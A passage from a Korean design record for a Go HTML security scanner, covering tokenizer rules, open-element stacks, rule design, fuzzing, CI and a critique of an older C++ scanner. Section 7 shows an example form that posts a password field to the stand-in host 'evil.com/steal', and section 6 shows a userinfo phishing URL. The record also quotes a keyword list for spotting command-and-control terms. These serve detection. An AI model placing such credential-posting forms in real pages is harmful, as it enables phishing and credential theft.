# HTML Scanner — 설계 논의 기록

> 목표: HTML을 파싱해 **XSS 취약점**과 **링크·리소스**를 찾아내는 보안 스캐너 (Go)

---

## 1. 파서를 어디까지 만들 것인가

**논의** — DOM 파서로 만들면 되는가?

**결론** — DOM은 대안이 아니라 **상위 계층**이다. 순서의 문제였음.

```
바이트 → ① Tokenizer → ② Tree Construction → DOM
         (구현 완료)      (보류)              (보류)
```

| 근거 | |
|---|---|
| 필요 충분 | 목표(XSS·링크·리소스)는 "태그 하나"만 봐도 판정 가능 |
| 낭비 없음 | DOM을 만들더라도 ①은 어차피 선행 필수 |
| 난이도 | ②에는 암묵적 태그 닫기, foster parenting 등 함정이 집중돼 있음 |

**재검토 조건** — "`<form>` 안에 CSRF 토큰이 있는가" 같은 **구조 질의**가 요구될 때.

---

## 2. 관통하는 원칙: Parser Differential

> **내 토크나이저가 브라우저와 다르게 해석하는 지점 = 취약점을 놓치는 지점**

일반 파서는 "잘 파싱하면" 성공이지만, 보안 스캐너는 **브라우저와 동일하게** 해석해야 한다.

**따름정리 1** — 정규화는 토크나이저에서 끝낸다. 규칙 쪽에서 대소문자·공백을 매번 신경 쓰게 만들면 언젠가 한 곳을 빠뜨린다.

**따름정리 2** — 판정은 디코딩된 값으로, 리포트 표시는 원본으로. 난독화 자체가 신호이므로 원본을 버리면 안 된다.

---

## 3. 언어 선택: C++ → Go

**논의** — 기존 C++ 프로젝트(`old_c_files`, 1,406줄)를 이어갈 것인가.

**결론** — **Go로 전환.** C++ 자산은 코드가 아니라 **지식**(위협 분류, IOC)만 이식한다.

| 근거 | |
|---|---|
| 퍼징 | `go test -fuzz` 로 30초에 2,070만 케이스. 파서에 필수인데 C++은 libFuzzer+ASan 별도 구성이 필요 |
| 메모리 안전 | 적대적 입력을 파싱하는 도구의 파서 버그 = 스캐너 자체가 RCE 벡터 |
| 크로스 플랫폼 | C++ 버전은 `main.cpp`의 `#else` 중괄호 누락으로 macOS/Linux에서 실행 불가였음 |
| 생태계 | Trivy, Nuclei, gitleaks, Syft/Grype 등 현대 스캐너가 Go로 수렴 |

**뒤집힐 조건** — 기존 C++ 제품에 in-process 라이브러리로 임베딩해야 하는 경우. 해당 없음.

### C++ 버전에서 발견한 결함 (이식 시 수정 대상)

| | 내용 |
|---|---|
| 🔴 | `main.cpp` `#else` 분기에 중괄호 없음 → 비Windows에서 동작 불가 |
| 🔴 | H103의 form 열림/닫힘 반전 → 규칙이 절대 발동하지 않음 |
| 🟠 | meta `content` 대입이 else-if 밖 → 마지막 속성 값으로 덮어써짐 |
| 🟠 | `<!` 처리가 주석 끝까지 건너뛰지 않음 → 주석 안의 코드가 실제 태그로 파싱 |
| 🟡 | `isalpha(char)` — UTF-8 다바이트가 음수라 미정의 동작 |
| 🟡 | `svg:script` 를 RAWTEXT 취급 — 브라우저와 불일치 (실효 없음) |
| ⚪️ | `HtmlLoader.cpp` 전체가 죽은 코드, `cppcore` 부재로 저장소 단독 빌드 불가 |

---

## 4. 구조

| 항목 | 결정 | 근거 |
|---|---|---|
| 패키지 | `tokenizer/` + `scanner/` 분리 | Go의 패키지 단위는 파일이 아니라 디렉터리 |
| 인터페이스 | `Next()` **풀(pull) 모델** | C++의 push(SAX)는 분석기가 파서 문맥을 흉내내야 함 |
| 버퍼 | `[]byte` | 구조 문자가 전부 ASCII, UTF-8은 그대로 통과 |
| 테스트 | 테이블 주도 + `t.Run` | 파서는 케이스가 수십 개로 늘어나는 종류의 코드 |
| `main` | 파일 읽기 + 스캔 호출 + 출력만 | 규칙을 소유하면 테스트할 수 없다 |

### Push vs Pull

C++은 `parser.SetHandler(&analyzer)` 방식이라 분석기가 `m_inForm` 같은 상태를 직접 관리해야 했고, 그것이 H103 반전 버그의 배경이 되었다. Pull 모델에서는 소비자가 루프를 소유하므로 문맥 추적이 자유롭다.

Push의 정당한 장점은 스트리밍이지만, C++ `main`이 파일을 통째로 읽어 넘기고 있어 실현되지 않았다.

---

## 5. 파싱 규칙

| # | 논의 | 결정 |
|---|---|---|
| 1 | `<` 는 항상 태그인가 | **아니다.** 다음 글자가 영문자·`/`·`!`·`?` 일 때만 |
| 2 | 태그 이름 대소문자 | **ASCII 소문자로 정규화** (`<ScRiPt>` 우회 차단) |
| 3 | `strings.ToLower` | **불가.** 유니코드를 건드려(켈빈 기호, 터키어 İ) 브라우저와 어긋남 |
| 4 | `<script>` 내부 | **원시(raw) 모드.** `style`, `textarea`, `title`, `iframe` 등 8종 |
| 5 | RAWTEXT vs RCDATA | `title`/`textarea` 만 문자 참조를 해석 (`Token.Raw`) |
| 6 | 속성 값 | 따옴표 종류(`Quote`)까지 보존 |
| 7 | 중복 속성 | 슬라이스로 **전부 보존**, 조회 시 **첫 번째** (브라우저 동작) |
| 8 | 위치 정보 | 토큰엔 **오프셋만**, 줄:칸은 조회 시 계산 |
| 9 | self-closing | 플래그만 노출. "실제로 닫혔는가"는 트리 구성의 일 |
| 10 | 문자 참조 | **별도 레이어**(`entity.go`). 상태 기계에 섞지 않음 |
| 11 | 이름 참조 세미콜론 | **필수** (숫자 참조는 선택) — 쿼리 스트링 `&copy=2` 보호 |
| 12 | 주석 | `-->` 와 `--!>` 로 닫힘. `Data` 는 내용만 |
| 13 | `</>` / `</ b>` | 각각 **무시** / **주석** (브라우저 동작) |
| 14 | script 내부 `<!--` | escaped → doubleEscaped 상태 추적. **doubleEscaped에서는 `</script>` 가 닫지 않음** |

### 핵심 결정의 근거

**#8 위치 정보** — `t.pos++` 가 14곳이라 증분 갱신은 한 곳만 빠뜨려도 조용히 어긋난다. 오프셋은 이미 `start` 변수로 갖고 있으므로 저장이 공짜고, 계산은 `sort.Search` 이진 탐색 한 곳으로 모인다. 칸(col)은 바이트가 아니라 **글자(rune)** 기준 — 한글 페이지에서 에디터와 어긋나면 리포트가 쓸모없어진다.

**#10 별도 레이어** — 명세는 상태 6개로 다루지만, 상태 기계가 이미 충분히 복잡하고 무한 루프 위험이 커진다. 분리하면 `Unescape("&#106;")` 만 독립적으로 테스트할 수 있다.

**#14** — 양방향으로 틀린다. 존재하지 않는 `<img onerror>` 를 만들어내는 **오탐**이자, 진짜 스크립트 내용을 HTML로 착각해 스크립트 대상 규칙이 안 도는 **미탐**.

---

## 6. 규칙 계층 설계

**논의** — 규칙을 어떤 모양으로 둘 것인가.

**1차 결론** — 순수 함수. `func(tok Token) []Finding`

```
scanner.go   엔진 — 타입, 순회, 오프셋→줄:칸 변환   (거의 고정)
rules.go     규칙 — 무엇을 위험으로 볼 것인가        (계속 자람)
```

**2차 결론(수정)** — H103(Cross-Origin Form POST)을 이식하려니 **"지금 어느 form 안인가"** 를 기억해야 했다. 순수 함수로는 표현 불가.

```go
type Rule interface {
    Check(ctx *Context, tok tokenizer.Token) []Finding
}
type finisher interface {          // 선택적 인터페이스
    Finish(ctx *Context) []Finding
}
type ruleFunc func(...) []Finding  // 무상태 규칙용 어댑터
```

| 결정 | 근거 |
|---|---|
| 상태를 **규칙 안에** 가둔다 | C++은 분석기 전체가 공유해 추적이 안 됐고, 그래서 반전 버그가 남았다 |
| `var rules` → `newRules()` | 상태를 가진 규칙은 스캔마다 새로 만들어야 한다 |
| 모든 토큰을 규칙에 전달 | `</form>` 과 `TextToken` 을 봐야 하는 규칙이 생겼다 |
| `finisher` 를 별도 인터페이스로 | 피싱 페이지는 `</form>` 을 안 닫는 일이 흔하다 |
| `Context.Domain` | "이 파일이 어느 도메인의 것인가"는 파일 안에 없다 |

**`domainOf`의 `@` 처리** — `https://bank.com@evil.com/` 의 실제 접속지는 `evil.com`. 피싱의 고전적 수법이라 반드시 마지막 `@` 뒤를 취해야 한다.

---

## 7. 구조 질의 — 열린 요소 스택

**논의** — 규칙이 `<form>` 문맥을 `inForm` 플래그로 들고 있었다. 충분한가?

**결론** — 아니다. **브라우저와 어긋나는 미탐이 실재했다.**

```html
<form action="https://evil.com/steal">
  <form action="/safe">            <!-- 명세: form pointer 가 null 이 아니면 이 토큰은 무시된다 -->
    <input type="password">        <!-- 실제로는 바깥 evil.com 폼에 속한다 -->
  </form>
</form>
```

플래그 방식은 안쪽 `action="/safe"` 로 덮어써 **상대 경로로 판정하고 조용히 통과**시켰다.

**전체 DOM 트리 대신 열린 요소 스택**을 만들었다.

| 질문 | 플래그 | 스택 | 트리 |
|---|:---:|:---:|:---:|
| "지금 form 안인가" | ⚠️ | ✅ | ✅ |
| 중첩 form (form element pointer) | ❌ | ✅ | ✅ |
| "이 텍스트가 script 안인가" | ❌ | ✅ | ✅ |
| `<input form="id">` 원격 연결 | ❌ | ❌ | ✅ (실제로는 **맵**으로 충분했다 — §12.16) |
| CSS 셀렉터 질의 · foster parenting | ❌ | ❌ | ✅ |

| 결정 | 근거 |
|---|---|
| `scanner/stack.go` 에 둔다 | 토크나이저는 ①단계, 스택은 ②단계. 계층을 섞으면 토크나이저를 재사용할 수 없다 |
| void 요소는 쌓지 않는다 | `<img>`, `<input>` 등 14종은 내용을 가질 수 없다 |
| `closesP` · `autoClose` 표 | `<ul><li>a<li>b` 를 형제로 만들지 않으면 조상 질의가 전부 틀어진다 |
| `SelfClosing` 을 **무시**한다 | HTML에서 `<div/>` 는 닫히지 않는다. 8교시에 미뤄둔 판단을 여기서 내렸다 |
| 스택 갱신을 규칙보다 **먼저** | `<input>` 을 볼 때 이미 `<form>` 이 스택에 있어야 한다 |

**부수 효과** — 문맥을 스택이 흡수하자 규칙에서 상태가 사라졌다. `formOriginRule`(구조체 4필드 · 55줄)이 순수 함수 30줄이 되었고, 발견 위치도 `</form>` 이 아니라 문제의 `<input>` 을 가리키게 됐다.

---

## 8. 도구화

### 8.1 CLI

`old_c_files/main.cpp` 의 `<htmlfile> [url]` 인터페이스를 가져오고 Go답게 두 가지를 더했다.

| 결정 | 근거 |
|---|---|
| `main()` 은 `run()` 을 부르기만 | `os.Exit` 는 `defer` 를 실행하지 않는다 |
| 출력이 `파일:줄:칸:` 형식 | 컴파일러·린터의 표준. 에디터가 클릭으로 점프한다 |
| 발견은 stdout, 요약은 stderr | 기계가 읽을 것과 사람이 볼 것을 분리 |
| 종료 코드 `0`/`1`/`2` | 발견 없음 / 발견 있음 / 오류. **`1`과 `2`를 구분**해야 CI에서 쓸 수 있다 |

#### CLI 를 테스트할 수 있게 — 전역 셋을 인자로

종료 코드는 이 도구의 API 인데 **`main` 패키지 커버리지가 0%** 였다. `run()` 이 전역 셋에 몰래 기대고 있어서다.

| 전역 | 테스트에서 문제 |
|---|---|
| `flag.CommandLine` | `run` 을 두 번 부르면 `panic: flag redefined: min` |
| `os.Args` | `flag.Parse()` 가 몰래 읽는다 |
| `os.Stdout` · `os.Stderr` | 출력을 붙잡아 검사할 수 없다 |

```go
func run(args []string, stdout, stderr io.Writer) int
```

`flag.NewFlagSet(..., flag.ContinueOnError)` 로 호출마다 새 플래그 묶음을 만든다. `ExitOnError` 는 파싱 실패 시 그 자리에서 `os.Exit` 해 테스트 프로세스를 죽인다. `-h` 는 파싱 입장에선 `flag.ErrHelp` 지만 원래 `exit 0` 이었으므로 그대로 둔다.

**동작이 그대로인지** — 원본과 새 버전을 각각 빌드해 종료 코드 12가지(12/12 동일)와 출력 6가지를 바이트 단위로 비교했다. 차이는 사용법 첫 줄의 프로그램 이름뿐이다.

`main_test.go` 가 검증하는 것: 종료 코드 11가지 · `-min`/`-class` 필터 · 심각도 내림차순 · **참고(Notes)가 종료 코드를 바꾸지 않음**. 마지막 항목으로 §10 의 "Notes ≠ Findings" 가 CLI 계층까지 강제된다.

같은 교시에 `ParseSeverity` 가 커버리지 0% 인 것도 발견했다. 쌍둥이인 `ParseClass` 는 테스트가 두 개 있었다. **`Severity` 는 `Class` 와 달리 크기 비교를 한다**(`f.Severity < min`). 상수 순서를 바꿔봤더니 **기존 테스트 333개가 전부 통과**했고 `-min medium` 이 LOW 를 출력했다. `TestSeverityOrder` 가 순서 자체를 단언한다.

> 측정하다 빠진 함정 둘 — **`go run` 은 자식의 종료 코드를 `1` 로 뭉갠다**(반드시 빌드한 바이너리로 잰다). **zsh 는 `$변수` 를 공백으로 쪼개지 않는다**(bash 와 다르다).

### 8.2 퍼징

무작위 입력의 정답은 알 수 없으므로, 결과 대신 **항상 참이어야 하는 성질**을 검사한다.

| 대상 | 검사하는 성질 |
|---|---|
| `FuzzTokenizer` | panic 없음 · 토큰 수 ≤ 입력 길이(무한 루프) · 오프셋이 범위 안 |
| `FuzzUnescape` | 출력이 입력보다 **길어질 수 없다** |
| `FuzzScan` | 발견의 위치가 유효 · **두 번 스캔하면 같은 결과** |

`FuzzScan` 의 마지막 항목은 6절의 `newRules()` 결정을 코드로 못 박은 것이다. 누군가 전역 `var rules` 로 되돌리면 즉시 실패한다.

**씨앗이 곧 탐색 지도다.** `f.Add` 로 넣은 11개는 각 상태(원시 모드·escaped·주석·문자 참조·bogus comment·UTF-8)의 대표다. `<script><!--<script>` 를 무작위로 만들어낼 확률은 사실상 0이므로, 씨앗이 없으면 그 경로는 영원히 탐색되지 않는다.

**상설화의 핵심** — 크래시를 찾으면 그 입력이 `testdata/fuzz/<함수명>/<해시>` 로 저장된다. 이 파일을 커밋하는 순간 `-fuzz` 없이 도는 **영구 회귀 테스트**가 된다.

### 8.3 CI

| 잡 | 언제 | 목적 |
|---|---|---|
| `test` | 푸시·PR | gofmt · vet · test · build · **스모크** |
| `fuzz` | 푸시·PR(30초) + 주간(10분) | 매트릭스로 3대 병렬 |

스모크 단계는 **빌드된 바이너리로 자기 `testdata/` 를 스캔**한다. 정상 페이지는 `exit 0`, 악성 샘플은 `exit 1` 이어야 통과다. 오탐뿐 아니라 **미탐도 막는다** — 규칙이 망가지면 악성 샘플에서 아무것도 안 나온다.

러너는 잡마다 새 VM이라 `testdata/fuzz/` 크래시 파일이 잡 종료와 함께 사라진다. `upload-artifact` 로 건져내야 커밋할 수 있다.

---

## 9. 원본 HtmlScanner 분석 — 무엇이 실패했는가

이 프로젝트의 출발점은 `../HtmlScanner`(C++, 13,838줄)였다. 여러 지표를 모아 최종 심각도를 매기려 했으나 오탐·미탐의 바다가 되었고, 뒤엎기를 반복했다. 그 원인을 분해한다.

> **정정 (2026-09-10)** — 처음에는 탐지 항목을 9개로 적었다. `Detection.txt` 의
> `H101: Head anomalies` 를 항목으로 읽었으나 그건 **대역 요약**이었고, 실제 항목
> 목록은 `SignatureMap.h` 에 있다. 원본은 처음 평가한 것보다 훨씬 정교했다.
> 실패 원인은 규모가 아니라 **검증 층위와 점수 합산**이다.

| | |
|---|---:|
| 소스 | 13,838줄 |
| 탐지 항목 | **97개** (H1xx~H9xx, `SignatureMap.h`) |
| 그중 소스에서 실제 참조 | 97개 (죽은 항목 0) |
| 산출 지표 | 약 130개 |
| 조정 가능한 임계값 | **36개** |
| 점수 누적 지점 | **105곳** |
| 테스트 | 두 층 220개 — **음성 단언 0** |

대역별 항목 수: H1xx Head 24 · H2xx UI 16 · H3xx Forms 13 · H4xx Footer 13 ·
H5xx Brand 5 · H6xx Links 10 · H7xx Body 7 · H8xx Behavioral 8 · H9xx Block 1

### 9.1 점수를 합산해 심각도를 만들었다

```cpp
if (m_ui.headingSparse)              { m_ui.baseScore += 3; }
if (m_ui.thinContent == "very_thin") { m_ui.baseScore += 6; }
if (!m_ui.hasViewport)               { m_ui.baseScore += 2; }
...
if (total_score >= 85) return "HIGH";
if (total_score >= 25) return "WARN";
```

`<meta viewport>` 가 없으면 +2점. 그냥 오래된 페이지인데 위험 점수가 붙는다. 이런 게 105곳이고, **25점이라는 경계에 근거가 없다.** 정상적인 사내 위키 한 페이지가 WARN이 된다.

> 우리 프로젝트에는 점수 합산이 **한 곳도 없다.** 규칙은 각자 독립적으로 발견을 내고 심각도를 스스로 정한다. `cross-origin-password-form` 은 언제나 HIGH이며 다른 신호와 더해지지 않는다.

### 9.2 테스트는 있었으나 잘못된 층을 검증했다

테스트는 두 층에 있다.

| 테스트 | 입력 → 출력 | 규모 |
|---|---|---|
| `tests/run_tests.py` | HTML → 코드 | 46 케이스 |
| `SignatureTests.h` | **특징 → 코드** | 88 SECTION · 174 REQUIRE |

```
REQUIRE_FALSE / 음성 단언 :  0개  (174개 중)
HTML 을 실제로 파싱하는 테스트 :  0개
features[...] 직접 주입 :      142곳
```

**두 층 모두 "정상 입력에서 발동하지 않는가"를 한 번도 묻지 않는다.**

그리고 더 중요한 것 — C++ 테스트는 특징을 직접 주입한다.

```cpp
features["strong_cred_post_cross_etld"] = "1";
auto signatures = HtmlSignatureMapper::FormSignatures(features);
```

즉 **HTML → 특징 추출 단계가 통째로 검증되지 않는다.** 그런데 오탐은 전부 거기서 나온다.

#### 실측 — H803 "C2 terms detected"

```cpp
{"c2", "command and control", "c&c", "cnc", "beacon", "listener"}
```

평범한 대학 홈페이지에서 **6회 발동한다.**

```
'c2'        4회  ← UUID 파일명   aefc74c2-e9c0-43ce-…
'listener'  2회  ← addEventListener
```

단어 경계 없는 부분 문자열 매칭이다. 이 결함은 추출 단계(`HtmlAnalyzer.cpp:2265`)에 있고, 매핑 계층 테스트 174개는 그것을 볼 수 없다. `hasC2Terms = "1"` 을 주입해 놓고 H803이 나오는지만 확인하기 때문이다.

그리고 H803은 H821 "Combined behavioral threat" 의 입력이라, **오탐이 조합 규칙으로 전파된다.**

> "탐지 로직이 정확한지 검증하지 못했다"는 문제의 정체가 이것이다.
> 테스트가 없었던 게 아니라 **오탐이 생기는 층을 테스트하지 않았다.**

### 9.2.1 Combined 가 테스트를 무력화한 흔적

```cpp
// H303과 H310이 발동되므로 results.size() >= 2
// 하지만 H314 조합 패턴은 2개 이상이어야 하므로,
// 실제로는 가장 높은 confidence만 반환됨 또는 H314가 반환될 수 있음
REQUIRE((foundH314 || (foundH303 && signatures.size() == 1)));
```

**단언이 "H314 이거나, H303이면서 개수가 1"** 이다. 작성자가 어느 쪽이 나올지 몰라 둘 다 허용했다. `||` 를 포함한 REQUIRE 가 3개 있다.

**조합 규칙이 시스템 동작을 예측 불가능하게 만들어, 정확한 단언을 쓸 수 없게 했다.**

### 9.3 임계값 36개가 서로를 상쇄한다

`Detection.txt` 에 "Safety Caps 조정"이 반복된다. 오탐이 터지면 캡을 씌우고, 미탐이 생기면 가중치를 올린다. 임계값 36개의 상호작용은 조합이 사실상 무한하고, **어떤 값이 옳은지 판정할 방법이 없다.** 뒤엎기를 반복하게 만든 직접 원인이다.

### 9.4 검증 불가능한 지표

`brand_similarity = 0.47` 이 맞는 값인지 누구도 판정할 수 없다. 정답이 없으니 테스트를 쓸 수 없고, 테스트가 없으니 고쳐도 나아졌는지 알 수 없다.

### 9.5 97개 항목 판정

기준은 하나다. **"이 규칙이 틀렸다는 것을 테스트로 증명할 수 있는가?"**

| 판정 | 개수 | 대표 |
|---|---:|---|
| ✅ 이미 구현 | 14 | H302 · H205 · H206 · H704 · H602 |
| 🟢 살릴 수 있음 | 4 | H306/H307 · H308 · H104 · H901 |
| 🟡 조합 재료 | 3 | H115/H608 (TLD) · H313 (카드) · H311 (HTTP 폼) |
| ❌ 버림 | ~76 | 아래 |

#### 이미 구현 — 우리 규칙과의 대응

| 원본 | 우리 규칙 | 달라진 점 |
|---|---|---|
| H112 · H311 · H102(HTTP) | `mixed-content` | 하위 리소스만. `<a href>` 는 제외 |
| H102(IP literal) | `resource-ip-literal` | |
| H205 Base href attack | `base-href-external` | |
| H206 · H702 · H818 Data URI | `data-uri-document` | **길이 임계값 → 타입 × 컨텍스트** |
| H302 Credential theft | `cross-origin-password-form` | 중첩 form · `@` userinfo 처리 |
| H303 · H310 Form to IP | `form-action-ip` | |
| H602 · H609 Download/ext | `dangerous-download` | 설치 파일(exe·msi·jar) 제외 |
| H704 Meta refresh | `meta-refresh-scheme` | `data:`/`javascript:` 만 |
| H713 Body missing | `Notes` | **위험 → 분석 한계로 재분류** |
| H204 Iframe security | `iframe-sandbox-escape` | **누락 → 토큰 남용으로 방향 전환** |
| H712 Suspicious script | `webshell-signature` · `obfuscated-eval` | |

#### 버리는 이유별 분류

| 유형 | 대표 | 개수 | 왜 |
|---|---|---:|---|
| 유사도 기반 | H105 · H121 · H501~H505 · H309 | ~11 | `brand_similarity = 0.47` 이 맞는지 판정할 수 없다 |
| 임계값 기반 | H106(3+) · H603(50%+) · H604(90%+) · H304(5+) | ~13 | 경계에 근거가 없다 |
| 누락 자체를 위험으로 | H107~H111 · H120 · H214 · H417~H419 | ~13 | title·canonical·viewport 없음은 오래된 페이지일 뿐 |
| 푸터 품질 | H403~H422 | 13 | 연도 노후·무료 이메일은 위험이 아니다 |
| 콘텐츠 휴리스틱 | H203 · H209 · H212 · H213 · H715 | ~6 | 짧은 랜딩 페이지가 전부 걸린다 |
| 키워드 목록 | H211 · H215 · H802 · **H803** · H816 | ~7 | 단어 경계 없는 부분 문자열 매칭 |
| MITRE 자동 분류 | H819 · H820 | 2 | 23개 신호로 신뢰도 0.0~1.0 — 검증 불가 |
| Combined | H122 · H216 · H314 · H421 · H612 · H716 · H821 등 | 9 | 약한 신호의 합. 아래 9.5.1 |

#### 9.5.1 Combined — 합산이 아니라 논리곱이어야 한다

조합 자체가 문제는 아니다. **무엇을 조합하는가**가 문제다.

| | 원본 | 우리 |
|---|---|---|
| 형태 | `score += w₁; score += w₂; … if (total ≥ T)` | `if (A && B && C)` |
| 입력 | **약한 신호**의 합 | **검증 가능한 사실**의 논리곱 |
| 의미 | "나쁜 게 충분히 쌓였다" | "이 공격 패턴이다" |
| 임계값 | 필요 | **없음** |
| 테스트 | 단언이 `||` 가 된다 | 입력이 정해지면 출력이 하나 |

약한 신호를 여러 개 겹쳐도 강해지지 않는다. 겹치는 조건이 곧 새 임계값이 되고, 입력 하나가 오탐이면 조합 전체가 오탐이 된다 (H803 → H821).

우리는 이미 원칙적 조합을 쓰고 있다. `cross-origin-password-form` 이 그렇다.

```
A. <input type=password> 가 있다        ← 이진, 단독 테스트 가능
B. 그것이 <form> 안에 있다               ← 열린 요소 스택으로 판정
C. form action 호스트 ≠ 페이지 호스트    ← domainOf 로 판정
────────────────────────────────────────
A ∧ B ∧ C  →  HIGH
```

**원칙** — 악성 행위(공격자의 흔적)만 HIGH로 둔다. 개발자 실수나 방어 약화는 MEDIUM 이하다. 그래야 HIGH가 신호로 남는다.

### 9.6 측정이 규칙을 먼저 걸러낸다

규칙을 쓰기 전에 **정상 페이지에서 몇 건 나오는지** 잰다.

| 원본 규칙 | 실측 | 판정 |
|---|---|---|
| iframe `sandbox` 누락 | 1건 — Google Tag Manager 정상 iframe | **버림** |
| 스킴리스 `//` URL | 2건 — `//portal.jnu.ac.kr/...` 정상 | **버림** |
| `data:` base64 길이 ≥ 100 | 0건, 그러나 길이는 위험과 무관 | **재설계** |
| form action 미지정 | 현재 URL로 제출 — 정상 동작 | **버림** |
| `noscript-breakout` HIGH 조합 | 정상 `<noscript>` 17개 중 3개가 뒤에 실행 요소 | **버림** (§12.15) |

세 번째가 특히 중요하다. `<img src="data:image/png;…10KB…">` 는 무해하고 `<iframe src="data:text/html,…">` 는 50자여도 위험하다. **길이가 아니라 "어떤 타입을 어디에 넣었는가"** 가 위험을 결정한다.

### 9.7 규칙을 추가하는 절차

1. 판정 기준을 **한 문장으로 쓴다** — 못 쓰면 그 규칙은 버린다
2. **음성 케이스를 먼저 쓴다** — "정상 페이지에서 안 나오는가"
3. 양성 케이스를 쓴다
4. 구현한다
5. **`testdata/jnu_main.html` 탐지 수가 늘지 않는지 확인한다** — 늘면 오탐이다

5번이 원본에 없던 안전장치다. 실제 정상 페이지를 회귀 기준으로 삼는다.

---

## 10. 분석의 한계는 발견이 아니다

**논의** — SPA 셸처럼 내용을 스크립트가 그리는 페이지를 어떻게 다룰 것인가.

원본의 답:

```cpp
m_ui.baseScore += 12;   // SPA 셸 가중치
```

**SPA라는 사실이 위험 점수가 됐다.** 정상 React·Vue 사이트가 전부 +12점을 받는다.

**우리의 답** — SPA는 위험하지 않다. **우리가 그 내용을 못 볼 뿐이다.** 둘은 완전히 다른 진술이고 리포트에서 다른 자리를 차지해야 한다.

| | 의미 | 종료 코드 |
|---|---|---|
| `Finding` | 이 페이지에 이런 위험이 있다 | 영향 있음 (exit 1) |
| `Notes` | 우리가 이 페이지를 다 보지 못했다 | **영향 없음** |

| 결정 | 근거 |
|---|---|
| `Notes` 는 `[]string` | `Severity`·`Line` 을 주면 "위험도가 있는 무언가"가 되어버린다 |
| 판정은 `visibleText == 0` | 임계값을 쓰지 않는다. `< 100` 으로 잡으면 짧은 랜딩 페이지가 전부 걸린다 |
| `title`·`noscript`·`textarea`·raw 제외 | 특히 `noscript` — 거의 모든 SPA 셸에 있어서, 안 빼면 전부 놓친다 |
| 종료 코드에 넣지 않는다 | SPA 스캔이 exit 1 이면 정상 React 앱마다 CI가 깨진다 |

`<div id="app">Loading...</div>` 처럼 짧은 텍스트가 있는 셸은 **의도적으로 놓친다.** 과소 보고가 잘못된 보고보다 낫다.

### 10.1 중간 페이지 — 대상이 아닌 것을 분석하고 있다

원본 H901(WAF 차단)·H104(피싱 경고)도 같은 종류다. 둘 다 이 뜻이다.

> **지금 보고 있는 HTML 이 대상 사이트가 아니다.**

다른 발견들이 전부 그 경고 페이지에 대한 것이 되므로, 리포트 맨 앞에 와야 한다.

| | 무엇을 말하는가 | 출력 |
|---|---|---|
| H901 WAF 차단 | 스캐너가 차단됐다. **대상에 대한 판정 없음** | `Notes` 만 |
| H104 피싱 경고 | CDN 이 **대상을 피싱으로 분류**했다 | `Notes` + **HIGH 발견** |

H104를 HIGH로 두되 `Evidence` 에 출처를 남긴다 — `"제3자(Cloudflare) 판정"`. 우리가 찾아낸 것이 아니기 때문이다.

판정은 원본과 같은 논리곱을 쓰되 **`tok.Raw` 를 걸러** 스크립트 본문의 문자열은 보지 않는다. 원본은 `htmlText` 전체를 검색해 H803 의 `"c2"`→UUID 오탐을 만들었다.

```
"cloudflare" ∧ ("ray id"|"ray-id") ∧ ("attention required"|"error 1020"|…)
```

`"cloudflare"` 하나만으로는 발동하지 않는다 — 푸터에 "Powered by Cloudflare" 를 넣는 정상 사이트가 흔하다.

---

## 11. 규칙 코드 체계 — H번호를 쓰지 않는 이유

**논의** — 원본들처럼 H번호를 매길 것인가.

**결론** — 아니다. 두 원본이 **같은 번호를 다른 뜻으로** 쓴다.

| 코드 | `old_c_files` | `HtmlScanner` |
|---|---|---|
| H101 | Phishing API Abuse | **Head** anomalies |
| H301 | 익스플로잇킷 대역 | **Form** handling |
| H601 | 마이너 대역 | **External link** anomalies |

`old_c_files` 는 위협 종류별, `HtmlScanner` 는 HTML 위치별이다. **연속성을 줄 단일 원본이 없다.**

번호 자체의 문제도 있다.

| 문제 | |
|---|---|
| 읽을 수 없다 | `H304` 를 보고 무슨 규칙인지 알 수 없다 |
| 재배치 압력 | 대역이 차면 재번호 |
| 레지스트리 표류 | `Detection.txt`(7.8KB)처럼 코드와 별개인 문서를 손으로 맞춰야 한다 |

### 세 축을 분리한다

> **`Code` 는 신원, `Class` 는 종류, `Severity` 는 정도.**
> 셋을 한 값에 욱여넣으면 반드시 충돌한다.

원본은 번호 하나에 종류와 위치를 함께 담으려다 실패했다. `exfil-channel` 은 `<form action>` 과 스크립트 본문 **양쪽에서** 나오는데, 위치 기반 체계에서는 배치할 수 없다.

```
exfiltration / execution / origin / supply-chain / evasion / hardening
```

애매한 경우 **"이 규칙이 잡는 구별되는 신호는 무엇인가"** 를 묻는다.

- `obfuscated-eval` → Execution 이 아니라 **Evasion**. `eval()` 단독은 보고하지 않기로 했으므로, 구별되는 신호는 난독화 자체다.
- `iframe-sandbox-escape` → **Origin**. 탈출의 결과는 프레임 콘텐츠가 동일 출처 권한을 얻는 것이다.

---

## 12. 측정 결과

`testdata/jnu_main.html` (163KB, 실제 페이지) 기준.

### 12.1 원시 모드 도입 — 오탐 127건 제거

`<script>` 내부 JS 문자열(`$(...).append("<a class='...'>")`)이 가짜 태그로 잡히고 있었다.

| | 이전 | 이후 | 차이 |
|---|---:|---:|---:|
| 시작 태그 총계 | 831 | **704** | −127 |
| div | 241 | 200 | −41 |
| a | 132 | 106 | −26 |
| img | 58 | 44 | −14 |
| option | 22 | 12 | −10 |

> **숫자가 줄어드는 것이 개선이다.** 오탐이 많으면 결국 아무도 보지 않는다.

### 12.2 속성 파싱의 부수 효과

따옴표 안의 `>` (`alt="연구장비활용<br/> 장비검색"`)에서 태그가 조기 종료되고 있었다. 3곳이 고쳐졌고, 그중 한 `<a>` 태그의 **`target="_blank"` 가 그동안 스캐너에 보이지 않았다.**

### 12.3 현재 탐지 — 4건 (규칙 22종)

```
2468:5   MEDIUM supply-chain  [sri-missing]         <script> www.googletagmanager.com
 740:145 LOW    evasion       [zero-width]          텍스트에 U+200B
1164:48  LOW    hardening     [inline-handler]      5곳 (첫 위치: <a onclick=…>)
 123:92  INFO   hardening     [target-blank-no-rel] 80곳 (첫 위치: …/jnumain.aspx)
```

**실제 XSS 취약점은 0건.** 규칙이 22종인데 정상 페이지에서 4건만 나오고, 그중 2건이 `hardening`(취약점 아님)이다.

| 분류 | jnu_main (정상) | malicious_sample | spa_shell |
|---|---:|---:|---:|
| exfiltration | — | 2 | — |
| execution | — | 2 | — |
| evasion | 1 | 1 | — |
| supply-chain | 1 | — | — |
| hardening | **2** | — | — |
| **Notes** | — | — | **1** |

> 이전 기록의 8건에서 4건으로 줄었다. 규칙이 약해진 것이 아니라 §12.6 의 집계로
> `inline-handler` 5건이 1건으로 묶였다. **건수는 문제의 개수가 아니라 조치의 개수여야 한다.**

**분류만으로 세 페이지의 성격이 갈린다.** 원본이 총점 하나로 하려던 일이 점수 합산 없이 된다.

### 12.4 리소스 규칙을 구현하며 정정한 것

